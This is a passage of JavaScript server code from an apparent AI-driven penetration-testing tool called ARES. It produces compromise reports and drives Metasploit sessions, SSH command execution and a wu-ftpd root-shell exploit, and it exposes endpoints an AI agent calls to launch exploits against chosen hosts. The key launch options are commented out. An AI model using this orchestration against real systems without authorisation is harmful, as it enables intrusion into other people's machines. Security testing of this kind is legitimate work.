    // ── Métricas de tiempo del job ─────────────────────────────────────────────
    const scanCompleteLog = parsed.find(l => l.event_type === "scan_complete");
    const sessionLogs     = parsed.filter(l => l.event_type === "session_opened");
    const jobStartTs      = job.timestamp ? new Date(job.timestamp).getTime() : (allTs.length ? Math.min(...allTs) : null);
    const firstSessionTs  = sessionLogs.length
      ? Math.min(...sessionLogs.map(l => new Date(l.timestamp).getTime()))
      : null;
    const lastSessionTs   = sessionLogs.length
      ? Math.max(...sessionLogs.map(l => new Date(l.timestamp).getTime()))
      : null;
    const jobTimingMs = {
      scanDurationMs:           scanCompleteLog?.duration_ms                               ?? null,
      timeToFirstSessionMs:     jobStartTs && firstSessionTs ? firstSessionTs - jobStartTs : null,
      timeToAllSessionsMs:      jobStartTs && lastSessionTs  ? lastSessionTs  - jobStartTs : null,
      totalJobDurationMs:       jobStartTs && jobLastAt      ? new Date(jobLastAt).getTime() - jobStartTs : null,
    };

    const hostsScanned         = hostRows.length;
    const hostsWithVulns       = hostRows.filter(h => h.vulnsFound > 0).length;
    const hostsAttacked        = hostRows.filter(h => h.exploitAttempts > 0).length;
    const hostsCompromised     = hostRows.filter(h => h.sessionOpened).length;
    const totalVulnsFound      = hostRows.reduce((s, h) => s + h.vulnsFound, 0);
    const totalExploitAttempts = hostRows.reduce((s, h) => s + h.exploitAttempts, 0);
    const totalAttackMs        = hostRows.reduce((s, h) => s + (h.totalAttackMs ?? 0), 0);

    // ── Métricas de rendimiento derivadas ────────────────────────────────────
    const kpi = {
      // Eficacia: % de hosts atacados que resultaron comprometidos
      compromiseRate:       hostsAttacked > 0 ? Math.round((hostsCompromised / hostsAttacked) * 100) : 0,
      // Cobertura: % de hosts escaneados que tenían vulnerabilidades
      detectionCoverage:    hostsScanned > 0  ? Math.round((hostsWithVulns / hostsScanned) * 100)   : 0,
      // Precisión: % de intentos de exploit que abrieron sesión
      moduleAccuracyRate:   totalExploitAttempts > 0 ? Math.round((hostsCompromised / totalExploitAttempts) * 100) : 0,
      // Eficiencia: intentos necesarios por sesión obtenida (menor = más eficiente)
      attemptsPerSession:   hostsCompromised > 0 ? parseFloat((totalExploitAttempts / hostsCompromised).toFixed(1)) : null,
      // Tiempo medio de ataque por sesión obtenida
      avgTimePerSessionMs:  hostsCompromised > 0 ? Math.round(totalAttackMs / hostsCompromised) : null,
      // CVEs medios por host escaneado
      avgCvesPerHost:       hostsScanned > 0 ? parseFloat((totalVulnsFound / hostsScanned).toFixed(1)) : 0,
      // Éxito en primer intento: hosts donde el primer exploit funcionó
      firstAttemptSuccesses: hostRows.filter(h => h.sessionOpened && h.exploitAttempts === 1).length,
    };

    const summary = {
      hostsScanned,
      hostsWithVulns,
      hostsAttacked,
      hostsCompromised,
      totalVulnsFound,
      totalExploitAttempts,
      totalAttackMs,
      vulnsBySeverity: globalSeverity,
      jobFirstAt,
      jobLastAt,
      jobTimingMs,
      kpi,
    };

    const reportObj = {
      meta: {
        jobId:      job.id,
        agent:      agentName,
        type:       job.type,
        model:      job.model ?? null,
        startedAt:  job.timestamp,
        exportedAt: new Date().toISOString(),
      },
      summary,
      hosts: hostRows,
      activity: parsed.map(l => ({
        id:           l.id,
        timestamp:    l.timestamp,
        event:        l.event_type,
        intentos:     l.intentos,
        duration_ms:  l.duration_ms,
        observaciones: l.observaciones,
        details:      l.details,
      })),
    };

    const jsonPath = path.join(__dirname, "outputs", "informes_json", `ares_report_job${jobId}.json`);
    fs.writeFileSync(jsonPath, JSON.stringify(reportObj, null, 2), "utf-8");
    console.log(`[report] JSON guardado en ${jsonPath}`);

    res.json(reportObj);
  } catch (e) {
    console.error("[report] Error:", e.message);
    res.status(500).json({ error: "Error generando informe" });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// GET /report/:jobId/csv — informe estructurado por secciones, listo para Excel
// ══════════════════════════════════════════════════════════════════════════════
app.get("/report/:jobId/csv", async (req, res) => {
  const jobId = parseInt(req.params.jobId, 10);
  if (!jobId) return res.status(400).json({ error: "jobId inválido" });

  try {
    // Reutilizar la misma lógica del endpoint JSON
    const [[job]] = await db.execute("SELECT id, type, model, timestamp FROM jobs WHERE id = ?", [jobId]);
    if (!job) return res.status(404).json({ error: "Job no encontrado" });

    const [logs] = await db.execute(
      `SELECT id, event_type, reference_id, reference_table, details_json,
              intentos, duration_ms, observaciones, comentarios, timestamp
       FROM activity_logs WHERE jobs_id = ? ORDER BY id ASC`,
      [jobId]
    );

    const parsed = logs.map(l => {
      let details = {};
      try { details = JSON.parse(l.details_json) ?? {}; } catch {}
      return { ...l, details };
    });

    const hostIps = parsed.filter(l => l.event_type === "host_identified").map(l => l.details.ip).filter(Boolean);

    const fmtMs = (ms) => {
      if (!ms || ms <= 0) return "—";
      if (ms < 1000) return `${ms}ms`;
      if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
      const m = Math.floor(ms / 60000), s = Math.floor((ms % 60000) / 1000);
      return `${m}m ${s}s`;
    };

    const hostRows = hostIps.map(ip => {
      const vulnLogs    = parsed.filter(l => l.event_type === "vuln_identified" && l.details.ip === ip);
      const attemptLogs = parsed.filter(l =>
        (l.event_type === "exploit_failed" || l.event_type === "exploit_success") &&
        l.reference_table === "exploit_attempt" && l.details.ip === ip
      );
      const sessionLog     = parsed.find(l => l.event_type === "session_opened" && l.details.ip === ip);
      const finalSummaryLog = parsed.find(l =>
        l.event_type === "exploit_failed" && l.reference_table === "hosts" && l.details.ip === ip
      );
      const totalAttackMs = sessionLog?.duration_ms ?? finalSummaryLog?.duration_ms ??
        attemptLogs.reduce((s, l) => s + (l.duration_ms ?? 0), 0);

      const cveMap = {};
      for (const l of attemptLogs) {
        const cve = l.details.cve; if (!cve) continue;
        if (!cveMap[cve]) cveMap[cve] = { attempts: 0, success: false };
        cveMap[cve].attempts++;
        if (l.event_type === "exploit_success") cveMap[cve].success = true;
      }

      return {
        ip, vulnsFound: vulnLogs.length,
        vulns: vulnLogs.map(l => l.details),
        exploitAttempts: attemptLogs.length,
        cveBreakdown: Object.entries(cveMap).map(([cve, v]) => ({ cve, ...v })),
        sessionOpened: !!sessionLog,
        sessionType:   sessionLog?.details.type    ?? "",
        sessionCve:    sessionLog?.details.cve     ?? "",
        successModule: sessionLog?.details.module  ?? "",
        successPayload:sessionLog?.details.payload ?? "",
        timeToSessionMs: sessionLog?.duration_ms ?? null,
        totalAttackMs,
        osInfo: null,
        ports: [],
        failedModules: [],
      };
    });

    const agentName = job.type === "IA"
      ? `ARES IA - Aracni${job.model ? ` (${job.model})` : ""}`
      : "Manual (usuario)";

    const globalSev = { critical: 0, high: 0, medium: 0, low: 0 };
    for (const l of parsed.filter(l => l.event_type === "vuln_identified")) {
      const s = l.details.severity; if (s in globalSev) globalSev[s]++;
    }

    const esc = (v) => {
      if (v == null) return "";
      const s = String(v).replace(/"/g, '""');
      return s.includes(",") || s.includes('"') || s.includes("\n") ? `"${s}"` : s;
    };
    const row  = (...cols) => cols.map(esc).join(",");
    const sep  = () => "";
    const hdr  = (title) => `## ${title}`;

    const lines = [
      `# ARES Security Report`,
      `# Job: ${jobId} | Agente: ${agentName} | Inicio: ${job.timestamp} | Exportado: ${new Date().toISOString()}`,
      sep(),

      hdr("RESUMEN GENERAL"),
      row("Hosts escaneados",     hostRows.length),
      row("Con vulnerabilidades", hostRows.filter(h => h.vulnsFound > 0).length),
      row("Atacados",             hostRows.filter(h => h.exploitAttempts > 0).length),
      row("Comprometidos",        hostRows.filter(h => h.sessionOpened).length),
      row("Total vulns",          hostRows.reduce((s, h) => s + h.vulnsFound, 0)),
      row("Total intentos exploit",hostRows.reduce((s, h) => s + h.exploitAttempts, 0)),
      row("Tiempo activo total",  fmtMs(hostRows.reduce((s, h) => s + (h.totalAttackMs ?? 0), 0))),
      row("Vulns críticas",       globalSev.critical),
      row("Vulns altas",          globalSev.high),
      row("Vulns medias",         globalSev.medium),
      row("Vulns bajas",          globalSev.low),
      sep(),

      hdr("DESGLOSE POR HOST"),
      row("IP","Vulns encontradas","Intentos exploit","Tiempo activo","Sesión abierta","Tipo sesión","CVE exitoso","Módulo exitoso","Payload exitoso","Tiempo hasta sesión"),
      ...hostRows.map(h => row(
        h.ip, h.vulnsFound, h.exploitAttempts,
        fmtMs(h.totalAttackMs),
        h.sessionOpened ? "Sí" : "No",
        h.sessionType, h.sessionCve, h.successModule, h.successPayload,
        fmtMs(h.timeToSessionMs)
      )),
      sep(),

      hdr("DETALLE DE VULNERABILIDADES"),
      row("IP","CVE","Severidad","Servicio","Puerto"),
      ...hostRows.flatMap(h => h.vulns.map(v => row(h.ip, v.cve, v.severity, v.service, v.port))),
      sep(),

      hdr("INTENTOS DE EXPLOIT POR CVE Y HOST"),
      row("IP","CVE","Intentos","Resultado"),
      ...hostRows.flatMap(h => h.cveBreakdown.map(c => row(h.ip, c.cve, c.attempts, c.success ? "Éxito" : "Fallido"))),
      sep(),

      hdr("LOG DE ACTIVIDAD COMPLETO"),
      row("ID","Timestamp","Evento","IP","Módulo","CVE","Payload","Intentos","Duración (ms)","Observaciones"),
      ...parsed.map(l => row(
        l.id, l.timestamp, l.event_type,
        l.details.ip ?? "", l.details.module ?? "", l.details.cve ?? "", l.details.payload ?? "",
        l.intentos ?? "", l.duration_ms ?? "", l.observaciones ?? ""
      )),
    ];

    const csvContent = "\uFEFF" + lines.join("\n");

    const csvPath = path.join(__dirname, "outputs", "informes_csv", `ares_report_job${jobId}.csv`);
    fs.writeFileSync(csvPath, csvContent, "utf-8");
    console.log(`[report/csv] CSV guardado en ${csvPath}`);

    res.setHeader("Content-Type", "text/csv; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="ares_report_job${jobId}.csv"`);
    res.send(csvContent);
  } catch (e) {
    console.error("[report/csv] Error:", e.message);
    res.status(500).json({ error: "Error generando CSV" });
  }
});

// ══════════════════════════════════════════════════════════════════════════════
// POST /report/:jobId/save-pdf — recibe el PDF en base64 y lo guarda en disco
// ══════════════════════════════════════════════════════════════════════════════
app.post("/report/:jobId/save-pdf", async (req, res) => {
  const jobId = parseInt(req.params.jobId, 10);
  if (!jobId) return res.status(400).json({ error: "jobId inválido" });
  const { data } = req.body;
  if (!data) return res.status(400).json({ error: "Falta campo 'data' (base64)" });

  try {
    const pdfPath = path.join(__dirname, "outputs", "informes_pdf", `ares_report_job${jobId}.pdf`);
    fs.writeFileSync(pdfPath, Buffer.from(data, "base64"));
    console.log(`[report/pdf] PDF guardado en ${pdfPath}`);
    res.json({ ok: true });
  } catch (e) {
    console.error("[report/pdf] Error:", e.message);
    res.status(500).json({ error: "Error guardando PDF" });
  }
});

// GET /sessions — lista todas las sesiones activas de Metasploit
// ══════════════════════════════════════════════════════════════════════════════
app.get("/sessions", async (_req, res) => {
  // Helper: build raw-shell entries (never need msfconsole)
  const rawEntries = () => {
    const out = [];
    for (const [sid, rs] of Object.entries(rawShells)) {
      if (rs.process && !rs.process.killed)
        out.push({ id: parseInt(sid), type: "raw", arch: "x86", os: "linux", info: "wu-ftpd 7350wurm", ip: rs.ip });
    }
    return out;
  };

  // If msfconsole is busy (queue backed up from exploit run) skip the query
  // to avoid waiting 20 s and showing a scary error in the UI.
  if (!msfProc || msfProc.killed || msfQueue.length > 0)
    return res.json({ sessions: rawEntries(), busy: true });

  try {
    const { output, timedOut } = await msfRun(["sessions -l"], 20000);
    // On timeout return empty MSF list + raw shells — don't show error to UI
    if (timedOut) return res.json({ sessions: rawEntries(), busy: true });

    const clean = stripAnsi(output);

    // msfconsole wraps long session rows across multiple lines.
    // Join continuation lines (indented ≥10 spaces, no leading digit) with their parent row.
    const rawLines = clean.split("\n");
    const sessionLines = joinSessionLines(rawLines.join("\n")).split("\n");

    // Parse each (possibly joined) session row.
    const sessions = [];
    const seenMsfIds = new Set();
    for (const line of sessionLines) {
      const idM   = line.match(/^\s*(\d+)\s+/);
      if (!idM) continue;

      const typeM  = line.match(/\b(meterpreter|shell)\b/i);
      // RHOST IP: prefer (IP) format; fallback to first IP that appears after "->"
      const ipM    = line.match(/\((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\)/)
                  ?? line.match(/->.*?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+|\s)/);
      if (!typeM || !ipM) continue;

      const msfId  = idM[1];
      seenMsfIds.add(msfId);

      // Use ARES session ID when available so exploit-cmd routes correctly.
      // Exclude raw/ssh entries (msfId null) — they never appear in sessions -l.
      const aresEntry = Object.entries(activeSessions).find(
        ([, s]) => s.msfId !== null && String(s.msfId) === msfId
      );
      const archM  = line.match(/\b(?:meterpreter|shell)\s+(\w+)\/(\w+)/i);
      const infoM  = line.match(/\b(?:meterpreter|shell)\s+\w+\/\w+\s{2,}(.*?)\s{2,}\S+:\d+\s*->/i);

      sessions.push({
        id:   aresEntry ? parseInt(aresEntry[0]) : parseInt(msfId),
        type: typeM[1].toLowerCase(),
        arch: archM ? archM[1] : "unknown",
        os:   archM ? archM[2] : "unknown",
        info: infoM ? infoM[1].trim() : "",
        ip:   ipM[1],
      });
    }

    // Fallback: include ARES-registered MSF sessions not found in sessions -l
    // (session may have just died; user can still see it and get a clear error)
    for (const [aresId, sess] of Object.entries(activeSessions)) {
      if (sess.type === "raw" || sess.type === "ssh") continue;
      if (seenMsfIds.has(String(sess.msfId))) continue;
      sessions.push({
        id:   parseInt(aresId),
        type: sess.type,
        arch: "unknown",
        os:   "unknown",
        info: sess.cve ?? "",
        ip:   sess.ip,
        stale: true,
      });
    }

    // Añadir sesiones raw (7350wurm) que no aparecen en MSF
    for (const entry of rawEntries()) {
      sessions.push(entry);
    }

    res.json({ sessions });
  } catch (e) {
    console.error("[sessions] Error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /session-close — kill a session (MSF or SSH) and remove it from the registry
app.post("/session-close", async (req, res) => {
  const { sessionId } = req.body;
  if (!sessionId) return res.status(400).json({ error: "Falta el parámetro 'sessionId'" });

  const registryKey = Object.keys(activeSessions).find(k =>
    k === String(sessionId) || String(activeSessions[k]?.msfId) === String(sessionId)
  );
  const session = registryKey
    ? activeSessions[registryKey]
    : { type: "msf", msfId: sessionId };

  if (session.type === "raw") {
    const rs = rawShells[sessionId];
    if (rs?.process) { try { rs.process.kill(); } catch (_) {} }
    delete rawShells[sessionId];
    console.log(`[session-close] Killed raw shell session ${sessionId}`);
  } else if (session.type === "ssh") {
    console.log(`[session-close] Closed SSH session ${sessionId} (${session.user}@${session.ip})`);
  } else if (msfProc && !msfProc.killed) {
    await msfRun([`sessions -k ${session.msfId}`], 10000);
    console.log(`[session-close] Killed msf session ${session.msfId} (app session ${sessionId})`);
  }

  if (registryKey) delete activeSessions[registryKey];
  res.json({ success: true });
});

// ── SSH helper ─────────────────────────────────────────────────────────────
// Options shared by every profile
const SSH_COMMON = ["-oStrictHostKeyChecking=no", "-oConnectTimeout=8"];

// Profiles ordered from modern → maximally legacy.
// sshExec() tries them in order until one negotiates successfully.
const SSH_PROFILES = [
  // 0 — Modern OpenSSH: no extra options
  [],
  // 1 — group14 only (OpenSSH 6.x that dropped group1)
  ["-oKexAlgorithms=+diffie-hellman-group14-sha1"],
  // 2 — group1 + group14 + RSA host key + CBC cipher  (Red Hat 7 / OpenSSH 4-5)
  [
    "-oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
    "-oHostKeyAlgorithms=+ssh-rsa",
    "-c", "aes128-cbc",
  ],
  // 3 — Maximum compatibility: adds GEX-SHA1 and 3DES cipher (OpenSSH 3.x)
  [
    "-oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1",
    "-oHostKeyAlgorithms=+ssh-rsa",
    "-oPubkeyAcceptedKeyTypes=+ssh-rsa",
    "-c", "aes128-cbc,3des-cbc",
  ],
];

// Errors that mean negotiation failed — retry with next profile.
// Auth failures (Permission denied, etc.) are NOT negotiation errors.
const NEGO_RE = /no matching key exchange|no matching host key|no matching cipher|no matching MAC|unable to negotiate|kex_exchange_identification/i;

// Cache: ip → profile index that last negotiated successfully.
// Avoids re-probing every command to the same host.
const sshProfileCache = {};

// Run a single command via sshpass, auto-detecting the right SSH option profile.
async function sshExec(user, ip, password, command, timeoutMs = 25000) {
  const cached   = sshProfileCache[ip] ?? 0;
  // Try cached profile first, then the rest in order
  const order    = [cached, ...SSH_PROFILES.map((_, i) => i).filter(i => i !== cached)];

  let lastResult = { stdout: "", stderr: "No SSH profile negotiated", code: 255 };

  for (const idx of order) {
    const opts = SSH_PROFILES[idx];
    const result = await new Promise((resolve) => {
      execFile(
        "sshpass",
        ["-p", password, "ssh", ...SSH_COMMON, ...opts, `${user}@${ip}`, command],
        { timeout: timeoutMs },
        (err, stdout, stderr) => resolve({
          stdout: stdout ?? "",
          stderr: stderr ?? "",
          code:   err?.code ?? 0,
        }),
      );
    });

    if (NEGO_RE.test(result.stderr)) {
      // Negotiation failure — try next profile
      console.log(`[ssh] Profile ${idx} negotiation failed for ${ip}, trying next...`);
      lastResult = result;
      continue;
    }

    // Auth failure or success — negotiation worked → cache this profile.
    // Only update if not already set (parallel calls may race; first winner keeps it).
    if (sshProfileCache[ip] === undefined) {
      sshProfileCache[ip] = idx;
      console.log(`[ssh] Cached profile ${idx} for ${ip}`);
    }
    return result;
  }

  return lastResult; // all profiles failed at negotiation level
}





// POST /exploit-cmd — run a command in an active session (MSF or SSH)
app.post("/exploit-cmd", async (req, res) => {
  const { sessionId, command } = req.body;
  if (!sessionId || !command) return res.status(400).json({ error: "Faltan parámetros 'sessionId' y 'command'" });

  let session = activeSessions[sessionId];

  // Buscar por msfId si no está directamente en activeSessions
  if (!session) {
    session = Object.values(activeSessions).find(s => String(s.msfId) === String(sessionId));
  }

  // Sesión conectada desde Session Manager (no pasó por el flujo de exploit) — usarla directamente como MSF
  if (!session) {
    if (!msfProc || msfProc.killed) return res.status(503).json({ error: "msfconsole no está activo" });
    session = { type: "msf", msfId: sessionId };
  }

  // ── Raw shell session (wu-ftpd / 7350wurm) ───────────────────────────────
  if (session.type === "raw") {
    const output = await rawExec(sessionId, command);
    return res.json({ output });
  }

  // ── SSH session: run command directly via sshpass, tracking cwd ─────────────
  if (session.type === "ssh") {
    // Quote a path for safe use in single-quoted shell string
    const shellPath = (p) => `'${p.replace(/'/g, "'\\''")}'`;
    // Prefix to restore directory before every command (empty if still at home)
    const cwdPrefix = session.cwd ? `cd ${shellPath(session.cwd)} 2>/dev/null && ` : "";

    // cd command: resolve the new directory and store it
    const cdMatch = command.match(/^cd(?:\s+(.*))?$/);
    if (cdMatch !== null) {
      const target = (cdMatch[1] ?? "").trim();
      // Run cd and capture resulting pwd; if cd fails, pwd prints old dir
      const cdCmd  = target
        ? `${cwdPrefix}cd ${target} 2>&1 && pwd || (echo "cd: ${target}: No such file or directory" >&2; exit 1)`
        : "cd && pwd";
      const result = await sshExec(session.user, session.ip, session.password, cdCmd);
      const lines  = result.stdout.trim().split("\n").filter(Boolean);
      const newPath = lines[lines.length - 1] ?? "";
      if (result.code === 0 && newPath.startsWith("/")) {
        session.cwd = newPath;
        return res.json({ output: "" });
      }
      const err = (result.stderr + (lines.slice(0, -1).join("\n"))).trim();
      return res.json({ output: err || `cd: ${target}: No such file or directory` });
    }

    // All other commands: run in tracked directory
    const result = await sshExec(session.user, session.ip, session.password, `${cwdPrefix}${command}`);
    const out    = (result.stdout + (result.code !== 0 ? result.stderr : "")).trim();
    console.log(`[exploit-cmd] SSH session ${sessionId} cmd: ${command} (cwd=${session.cwd ?? "~"})`);
    return res.json({ output: out });
  }

  // ── MSF session ───────────────────────────────────────────────────────────
  if (!msfProc || msfProc.killed) return res.status(503).json({ error: "msfconsole no está activo — relanza el exploit primero" });

  const safeCmd = command.replace(/"/g, '\\"');
  const { output } = await msfRun([`sessions -c "${safeCmd}" -i ${session.msfId}`], 60000);
  console.log(`[exploit-cmd] Session ${sessionId} cmd: ${command}`);

  // Strip msfconsole noise — keep only the actual shell command output
  const clean = stripAnsi(output)
    .split("\n")
    .filter((l) => {
      const t = l.trim();
      if (!t) return false;
      if (/^AUTOPWN_/.test(t)) return false;                         // sentinel marker
      if (t === command.trim()) return false;                        // command echo
      if (/^msf/.test(t)) return false;                              // msf prompt lines (any variant)
      if (/^\[\*\] Running '/.test(t)) return false;                 // "[*] Running 'cmd' on session N"
      if (/^\[\*\] exec: echo/.test(t)) return false;                // sentinel echo line
      if (/^\[\*\] (Command shell|Meterpreter) session/.test(t)) return false;
      // ── Background exploit/handler noise ──────────────────────────────────
      if (/^\[[\*\-\+!\]]\] .*:\d+ -/.test(t)) return false;        // "[*] 1.2.3.4:445 - ..."
      if (/^\[\*\] Started (bind|reverse|)\s*(TCP|UDP|Meterpreter) handler/.test(t)) return false;
      if (/^\[\*\] Sending stage/.test(t)) return false;
      if (/^\[\*\] Meterpreter session \d+ (opened|closed)/.test(t)) return false;
      if (/^\[\*\] (Using|Selecting|Attempting) /.test(t)) return false;
      // ── Background session cleanup messages (stale sessions from prior runs) ─
      if (/^\[-\] (Meterpreter|Command shell) session \d+ is not valid/.test(t)) return false;
      if (/^\[-\] Session \d+ .*(not in the session list|is not responding)/.test(t)) return false;
      if (/^use /.test(t)) return false;                             // reflected "use module" cmds
      if (/^set /.test(t)) return false;                             // reflected "set OPTION" cmds
      if (/^run$|^exploit$/.test(t)) return false;                   // reflected run/exploit cmds
      return true;
    })
    .join("\n")
    .trim();

  res.json({ output: clean });
});

// ══════════════════════════════════════════════════════════════════════════════
// FUNCIONES META — endpoints atómicos para el agente IA
// Cada llamada hace exactamente UNA cosa con parámetros 100% deterministas.
// No hay bucles internos, no hay arrays, no hay lógica de decisión.
// La IA es el bucle — llama a estas funciones tantas veces como necesite.
// ══════════════════════════════════════════════════════════════════════════════

// POST /run-exploit — lanza UN exploit concreto con UN payload concreto contra UN host
// La IA decide qué módulo y payload usar; esta función solo los ejecuta y mide.
app.post("/run-exploit", async (req, res) => {
  const { ip, module: mod, payload, port: rport, cve: cveParam = null, jobId, options: extraOptions = {} } = req.body;

  if (!ip || !mod) {
    return res.status(400).json({ error: "Faltan parámetros: ip, module" });
  }
  if (!/^[\d.]+$/.test(ip)) {
    return res.status(400).json({ error: "IP inválida" });
  }

  const t0 = Date.now();

  // ── Wu-ftpd / 7350wurm (raw shell local, no Metasploit) ─────────────────
  if (/wu.?ftpd|7350wurm/i.test(mod)) {
    const ftpRes = await tryFtpExploit(ip);
    const duration_ms = Date.now() - t0;
    if (ftpRes.sessionId) {
      if (jobId) {
        try {
          const [[row]] = await db.execute(
            "SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
          if (row) {
            const [att] = await db.execute(
              "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, 21, 1, ?, ?, 'done')",
              [jobId, row.id, duration_ms, "module: wu-ftpd 2.6.1-16 / 7350wurm | result: Shell root obtenida"]);
            const [sess] = await db.execute(
              "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state) VALUES (?, ?, 'shell', 'exploit', 'CVE-2000-0573', 'done')",
              [jobId, row.id]);
            await logActivity(jobId, "exploit_success", att.insertId, "exploit_attempt",
              { ip, module: "wu-ftpd 2.6.1-16 / 7350wurm", cve: "CVE-2000-0573", port: 21 }, {});
            await logActivity(jobId, "session_opened", sess.insertId, "exploit_session",
              { ip, type: "shell", cve: "CVE-2000-0573", module: "wu-ftpd 2.6.1-16 / 7350wurm" },
              { duration_ms });
          }
        } catch (e) { console.error("[run-exploit/ftp] DB error:", e.message); }
      }
      return res.json({ success: true, sessionId: ftpRes.sessionId, output: ftpRes.log,
        exploitModule: "wu-ftpd 2.6.1-16 / 7350wurm" });
    }
    return res.json({ success: false, output: ftpRes.log ?? "wu-ftpd exploit failed" });
  }

  ensureMsf();
  await msfRun(["jobs -K"], 10000);
  await new Promise((r) => setTimeout(r, 1500));

  const isBind        = !payload || payload.includes("bind");
  const isInteract    = !payload || /interact/i.test(payload ?? "");
  const isInteractOnly = isInteract && /vsftpd/i.test(mod);
  const lhost         = getLhost(ip);
  const lport         = lportBase++;
  const ipEscaped     = ip.replace(/\./g, "\\.");

  const cmds = [
    `use ${mod}`,
    // --- Configuración y lanzamiento del exploit deshabilitados en esta versión pública ---
    // `set RHOSTS ${ip}`,
    // rport                ? `set RPORT ${rport}`       : null,
    // !isBind && !isInteract ? `set LHOST ${lhost}`     : null,
    // payload && !isInteract ? `set LPORT ${lport}`     : null,
    // payload              ? `set PAYLOAD ${payload}`   : null,
    // Opciones extra definidas por la IA (e.g. SMBUser, SMBPass, SMBDomain)
    // ...Object.entries(extraOptions || {}).map(([k, v]) => `set ${k} ${v}`),
    // isInteractOnly       ? "run"                      : "run -j",
    // isInteractOnly       ? "background"               : null,
  ].filter(Boolean);

  console.log(`[run-exploit] ${mod} payload=${payload ?? "self-contained"} → ${ip}:${rport ?? "default"}`);

  const { output: runOut, timedOut } = await msfRun(cmds, 300000);

  if (timedOut) {
    return res.json({ success: false, duration_ms: Date.now() - t0, output: runOut, reason: "timeout" });
  }

  // Wait for session to appear — same timing logic as /exploit
  let sessOut = "";
  if (isInteractOnly) {
    await new Promise((r) => setTimeout(r, 2000));
    const { output: s } = await msfRun(["sessions -l"], 15000);
    sessOut = s;
  } else if (!payload) {
    await new Promise((r) => setTimeout(r, 15000));
    const { output: early } = await msfRun(["sessions -l"], 15000);
    sessOut = early;
    if (!/meterpreter|shell/i.test(stripAnsi(early))) {
      await new Promise((r) => setTimeout(r, 30000));
      const { output: late } = await msfRun(["sessions -l"], 15000);
      sessOut = late;
    }
  } else {
    const isEternalblueRE = /ms17_010_eternalblue/i.test(mod);
    await new Promise((r) => setTimeout(r, isEternalblueRE ? 25000 : 15000));
    const { output: s } = await msfRun(["sessions -l"], 15000);
    sessOut = s;
    // If still no session after initial wait, give it one more check
    if (!/meterpreter|shell/i.test(stripAnsi(s))) {
      await new Promise((r) => setTimeout(r, 10000));
      const { output: s2 } = await msfRun(["sessions -l"], 15000);
      sessOut = s2;
    }
  }

  const combined       = runOut + "\n" + sessOut;
  // sessionOpened must reference THIS target's IP — avoids false positives from
  // async session messages of other hosts appearing in the output stream.
  const sessionOpened  = new RegExp(
    `(?:session \\d+ opened|meterpreter session \\d+ opened|command shell session \\d+ opened|found shell)[^\\n]*${ipEscaped}`, "i"
  ).test(combined);
  const sessMatches2   = [...joinSessionLines(stripAnsi(sessOut)).matchAll(
    new RegExp(`^\\s*(\\d+)\\s+.*?\\b(meterpreter|shell)\\b.*${ipEscaped}`, "gmi")
  )];
  const sessRow        = sessMatches2.at(-1) ?? null;

  const duration_ms = Date.now() - t0;

  if (sessionOpened || sessRow) {
    const idFromText2 = combined.match(/(?:meterpreter|command shell|shell) session (\d+) (?:opened|created)/i);
    const msfId     = sessRow ? sessRow[1] : (idFromText2 ? idFromText2[1] : "1");
    const type      = sessRow ? sessRow[2] : "meterpreter";
    const sessionId = ++sessionCounter;
    activeSessions[sessionId] = { msfId, type, ip, cve: null, module: mod, payload };
    console.log(`[run-exploit] Session ${sessionId} opened in ${duration_ms}ms`);

    if (jobId) {
      try {
        const [[hostRow]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
        if (hostRow) {
          const [attResult] = await db.execute(
            "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, ?, 1, ?, ?, 'done')",
            [jobId, hostRow.id, rport ?? null, duration_ms, msfSummary(combined, mod, payload)]
          );
          const [sessResult] = await db.execute(
            "INSERT INTO exploit_session (jobs_id, host_id, type, method, cve, state, duration_ms) VALUES (?, ?, ?, 'exploit', ?, 'done', ?)",
            [jobId, hostRow.id, type, cveParam ?? null, duration_ms]
          );
          await logActivity(jobId, "exploit_success", attResult.insertId, "exploit_attempt",
            { ip, module: mod, payload, cve: cveParam, port: rport },
            { intentos: 1, duration_ms, observaciones: `Sesión ${type} abierta via run-exploit — ${mod}` }
          );
          await logActivity(jobId, "session_opened", sessResult.insertId, "exploit_session",
            { ip, type, cve: cveParam, module: mod, payload },
            { intentos: 1, duration_ms, observaciones: `Sesión ${type} abierta en ${ip} via run-exploit — ${mod}` }
          );
        }
      } catch (dbErr) { console.error("[run-exploit] Error BD:", dbErr.message); }
    }

    return res.json({ success: true, sessionId, duration_ms, module: mod, payload: payload ?? null, output: combined });
  }

  if (jobId) {
    try {
      const [[hostRow]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
      if (hostRow) {
        const [attResult] = await db.execute(
          "INSERT INTO exploit_attempt (jobs_id, host_id, port, success, duration_ms, output, state) VALUES (?, ?, ?, 0, ?, ?, 'done')",
          [jobId, hostRow.id, rport ?? null, duration_ms, msfSummary(combined, mod, payload)]
        );
        await logActivity(jobId, "exploit_failed", attResult.insertId, "exploit_attempt",
          { ip, module: mod, payload, cve: cveParam, port: rport },
          { intentos: 1, duration_ms, observaciones: msfSummary(combined, mod, payload) }
        );
      }
    } catch (dbErr) { console.error("[run-exploit] Error BD:", dbErr.message); }
  }

  // ── Fallbacks automáticos cuando el módulo especificado falla ─────────────
  let fullLog = combined;
  let hostRowFb = null;
  if (jobId) {
    try {
      const [[r]] = await db.execute("SELECT id FROM hosts WHERE jobs_id = ? AND target_host = ?", [jobId, ip]);
      hostRowFb = r ?? null;
    } catch (_) {}
  }

  // Helper: registra sesión en BD y devuelve respuesta de éxito
  const fbSuccess = async (fbSessionId, fbType, fbCve, fbMod, fbPayload, fbLog) => {
    if (jobId && hostRowFb) {
      try {
        await db.execute(
